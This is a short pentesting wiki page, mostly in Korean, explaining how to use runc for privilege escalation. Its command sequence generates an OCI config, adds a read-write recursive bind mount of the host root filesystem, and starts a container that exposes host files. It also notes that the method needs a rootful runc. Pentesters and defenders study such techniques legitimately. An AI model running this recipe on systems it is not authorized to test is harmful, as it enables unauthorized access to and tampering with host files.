# RunC Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## 기본 정보

**runc**에 대해 더 알아보려면 다음 페이지를 확인하세요:

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

호스트의 rootful 프로세스에서 `runc`를 사용할 수 있다면, 호스트의 `/`를 컨테이너 내부의 `/`에 재귀적으로 bind-mount하도록 mount 구성을 설정한 OCI bundle을 사용할 수 있으며, 이를 통해 해당 mount namespace에서 호스트 파일 시스템이 노출됩니다.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
"type": "bind",
"source": "/",
"destination": "/",
"options": [
"rbind",
"rw",
"rprivate"
]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```
> [!CAUTION]
> 문서화된 `runc run` workflow는 rootful입니다. runc 자체 예제에서는 이를 "run as root"라고 표시합니다. 권한이 없는 사용자는 `runc spec --rootless`와 같은 rootless configuration이 필요하며, runc는 해당 mode에서 user namespaces가 활성화되어야 한다고 문서화하고 있습니다.<sup>[[1]](#references)</sup>

## References

- [1] [컨테이너 생성 및 실행을 위한 CLI tool: runc](https://github.com/opencontainers/runc#using-runc)
- [2] [OCI Runtime Specification: Mounts](https://github.com/opencontainers/runtime-spec/blob/main/config.md#mounts)
- [3] [Shared Subtrees](https://docs.kernel.org/filesystems/sharedsubtree.html)
{{#include ../../banners/hacktricks-training.md}}
